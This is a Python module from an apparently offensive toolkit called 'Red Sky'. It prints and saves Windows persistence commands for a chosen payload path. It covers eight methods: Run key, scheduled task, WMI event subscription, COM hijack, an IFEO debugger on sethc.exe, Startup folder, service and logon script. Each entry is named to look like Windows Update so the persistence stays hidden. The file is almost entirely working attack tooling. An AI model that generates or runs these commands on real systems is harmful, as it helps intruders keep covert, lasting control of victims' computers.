# language: Python, file: Program/payload/persistence.py, target: Red Sky payload — persistence
# Windows persistence catalog. Generates the artifacts + command lines needed
# to install each method. The user runs the commands on the target themselves.

import json
import os
import sys
import textwrap
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


METHODS = {
    "runkey": {
        "name": "HKCU Run key",
        "admin": False,
        "stealth": "low",
        "desc": "Executes payload on user logon. Registry value in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
    },
    "task": {
        "name": "Scheduled Task",
        "admin": False,
        "stealth": "medium",
        "desc": "Executes on logon or schedule via schtasks. More reliable than Run key.",
    },
    "wmi": {
        "name": "WMI Event Subscription",
        "admin": False,
        "stealth": "high",
        "desc": "Permanent WMI event consumer — fires on a trigger, fileless.",
    },
    "com": {
        "name": "COM Hijack",
        "admin": False,
        "stealth": "high",
        "desc": "Hijacks a CLSID under HKCU to load your DLL in a trusted process.",
    },
    "ifeo": {
        "name": "IFEO Debugger",
        "admin": True,
        "stealth": "high",
        "desc": "Image File Execution Options — hijacks a binary's launch to run yours.",
    },
    "startup": {
        "name": "Startup Folder",
        "admin": False,
        "stealth": "low",
        "desc": "Drops a shortcut or exe in the Startup folder.",
    },
    "service": {
        "name": "Windows Service",
        "admin": True,
        "stealth": "medium",
        "desc": "Registers a service that starts on boot. Requires admin.",
    },
    "logon_script": {
        "name": "User Logon Script",
        "admin": False,
        "stealth": "medium",
        "desc": "Sets the UserInitMprLogonScript registry value in HKCU.",
    },
}


def _gen_runkey(payload: str) -> str:
    return textwrap.dedent(f'''
        # HKCU Run key — runs at user logon
        reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /t REG_SZ /d "{payload}" /f
    ''').strip()


def _gen_task(payload: str) -> str:
    return textwrap.dedent(f'''
        # Scheduled task that fires on logon
        schtasks /create /tn "WindowsUpdateTask" /tr "{payload}" /sc onlogon /rl highest /f
    ''').strip()


def _gen_wmi(payload: str) -> str:
    return textwrap.dedent(f'''
        # WMI permanent event subscription — fires every 60s
        $filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{
            Name = "WUFilter";
            EventNamespace = "root\\cimv2";
            QueryLanguage = "WQL";
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }}
        $consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{
            Name = "WUConsumer";
            CommandLineTemplate = "{payload}"
        }}
        Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{
            Filter = $filter;
            Consumer = $consumer
        }}
    ''').strip()


def _gen_com(payload: str) -> str:
    return textwrap.dedent(f'''
        # COM hijack — hijacks CLSID 42AEDC87-2188-41FD-B9A3-0C966FEABEC1
        # (loaded by explorer.exe). Point InprocServer32 to your DLL.
        reg add "HKCU\\Software\\Classes\\CLSID\\{{42AEDC87-2188-41FD-B9A3-0C966FEABEC1}}\\InprocServer32" /ve /t REG_SZ /d "{payload}" /f
        reg add "HKCU\\Software\\Classes\\CLSID\\{{42AEDC87-2188-41FD-B9A3-0C966FEABEC1}}\\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
    ''').strip()


def _gen_ifeo(payload: str) -> str:
    return textwrap.dedent(f'''
        # IFEO Debugger — sethc.exe (sticky keys) launches your payload when triggered
        reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "{payload}" /f
    ''').strip()


def _gen_startup(payload: str) -> str:
    return textwrap.dedent(f'''
        # Startup folder drop — copy to Startup and it runs on logon
        copy "{payload}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe"
    ''').strip()


def _gen_service(payload: str) -> str:
    return textwrap.dedent(f'''
        # Windows Service — runs on boot, requires admin
        sc create WindowsUpdateSvc binPath= "{payload}" start= auto DisplayName= "Windows Update Service"
        sc start WindowsUpdateSvc
    ''').strip()


def _gen_logon_script(payload: str) -> str:
    return textwrap.dedent(f'''
        # User logon script via HKCU
        reg add "HKCU\\Environment" /v UserInitMprLogonScript /t REG_SZ /d "{payload}" /f
    ''').strip()


GENERATORS = {
    "runkey":       _gen_runkey,
    "task":         _gen_task,
    "wmi":          _gen_wmi,
    "com":          _gen_com,
    "ifeo":         _gen_ifeo,
    "startup":      _gen_startup,
    "service":      _gen_service,
    "logon_script": _gen_logon_script,
}


def cmd_list() -> int:
    print_info(f"{len(METHODS)} persistence methods")
    print()
    for key, m in METHODS.items():
        admin_tag = f"{SCARLET}[admin]{RESET}" if m["admin"] else f"{ASH}[user]{RESET}"
        print(f"  {ARTERY}▓{RESET} {BONE}{key:<14}{RESET} {m['stealth']:<8} {admin_tag}")
        print(f"      {ASH}{m['desc']}{RESET}")
    return 0


def cmd_gen(method: str, payload: str, out_file: str = "") -> int:
    if method == "all":
        methods = list(METHODS.keys())
    elif method in METHODS:
        methods = [method]
    else:
        print_err(f"unknown method: {method}")
        print_info(f"available: {', '.join(METHODS.keys())}, all")
        return 2

    print_info(f"generating persistence for {len(methods)} method(s)")
    print_kv("payload", payload)
    print()

    scripts = {}
    for m in methods:
        gen = GENERATORS[m]
        script = gen(payload)
        scripts[m] = script
        print(f"{ARTERY}{BOLD}── {METHODS[m]['name']} ({m}){RESET}")
        print(script)
        print()

    if out_file:
        out = Path(out_file)
    else:
        out = OUTPUT_DIR / "payload" / "persistence.txt"
    out.parent.mkdir(parents=True, exist_ok=True)
    with out.open("w") as f:
        for m, script in scripts.items():
            f.write(f"# ── {METHODS[m]['name']} ({m}) ──\n")
            f.write(script + "\n\n")
    print_kv("saved", out)
    return 0


def run_cli(args: List[str]) -> int:
    if not args:
        print_err("usage: redsky payload persistence <method|all|list> <payload_path> [out_file]")
        return 2

    if args[0] == "list":
        return cmd_list()
    if len(args) < 2:
        print_err("persistence needs a payload path")
        return 2
    method = args[0]
    payload = args[1]
    out_file = args[2] if len(args) > 2 else ""
    return cmd_gen(method, payload, out_file)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
